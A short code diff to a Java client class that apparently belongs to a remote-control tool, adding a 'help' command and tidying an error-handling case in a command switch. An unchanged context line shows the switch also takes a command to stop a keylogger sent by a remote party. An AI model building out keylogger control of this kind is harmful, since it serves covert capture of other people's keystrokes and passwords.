@@ -98,12 +98,13 @@ public class Client {
                         KeyLogger.stopKeylogger(from);
                         break;
                     case "help":
-
+                        GuideTable.requestGuide(from);
                         break;
                     default:
                         System.out.println("Something went wrong!");
-                        HandleSubCase.handleWrongRequest(choice[1]);
+                        HandleSubCase.handleWrongRequest(from);
 //                        throw new AssertionError();
+                        break;
                 }
             }
         }
